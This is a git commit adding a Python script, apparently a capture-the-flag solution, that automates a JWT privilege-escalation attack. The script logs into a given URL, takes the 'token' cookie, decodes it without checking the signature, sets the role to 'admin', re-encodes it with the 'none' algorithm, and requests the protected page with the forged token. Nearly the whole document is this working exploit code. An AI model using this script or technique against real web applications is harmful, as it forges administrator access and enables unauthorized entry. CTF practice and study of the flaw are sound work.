0a40e40ded0e82f3b8cd043e99c49a1ba3b82787
GluckZhang <zhanglong3030@qq.com>
2019-10-12 19:00:10 +0200

    a script to automatically capture the flag

---
+++ give_me_the_flag.py
@@ -0,0 +1,78 @@
+#!/usr/bin/python
+# -*- coding:utf-8 -*-
+
+import os, sys, requests, jwt
+import logging
+from optparse import OptionParser, OptionGroup
+
+__version__ = "0.1"
+
+def parse_options():
+    usage = r'usage: python3 %prog [options] -l LOGIN_URL -u USERNAME -p PASSWORD'
+    parser = OptionParser(usage = usage, version = __version__)
+
+    parser.add_option('-l', '--url',
+        action = 'store',
+        type = 'string',
+        dest = 'url',
+        help = 'The POST request url to login the website.'
+    )
+
+    parser.add_option('-u', '--username',
+        action = 'store',
+        type = 'string',
+        dest = 'username',
+        help = 'The username used to login.'
+    )
+
+    parser.add_option('-p', '--password',
+        action = 'store',
+        type = 'string',
+        dest = 'password',
+        help = 'The password used to login.'
+    )
+
+    options, args = parser.parse_args()
+    if options.url == None or options.username == None or options.password == None:
+        parser.print_help()
+        parser.error("Missing options.")
+        
+    return options
+
+def main():
+    options = parse_options()
+
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36"}
+    loginparams = {"username": options.username, "password": options.password}
+
+    session_requests = requests.session()
+    login_result = session_requests.post(options.url, data = loginparams, headers = headers)
+    if login_result.status_code == 200:
+        private_page_url = login_result.url
+        for cookie in session_requests.cookies:
+            if cookie.name == "token":
+                jwttoken = cookie.value
+                logging.info("successfully detect a jwt token: %s\n"%jwttoken)
+
+                header = jwt.get_unverified_header(jwttoken)
+                logging.info("jwt token header: %s\n"%header)
+
+                payload = jwt.decode(jwttoken, verify=False)
+                logging.info("jwt token payload: %s\n"%payload)
+
+                payload["role"] = "admin"
+                fake_jwttoken = jwt.encode(payload, None, algorithm="none")
+                logging.info("regenerate a jwt token using 'none' algorithm and changing the role into 'admin'")
+                logging.info(fake_jwttoken + "\n")
+                
+                cookie.value = fake_jwttoken.decode("utf-8")
+                break
+        flag_page = session_requests.get(private_page_url, headers = headers)
+        logging.info(flag_page.text)
+    else:
+        logging.error("Failed to login the website, please check the options.")
+        sys.exit(1)
+
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
+    main()
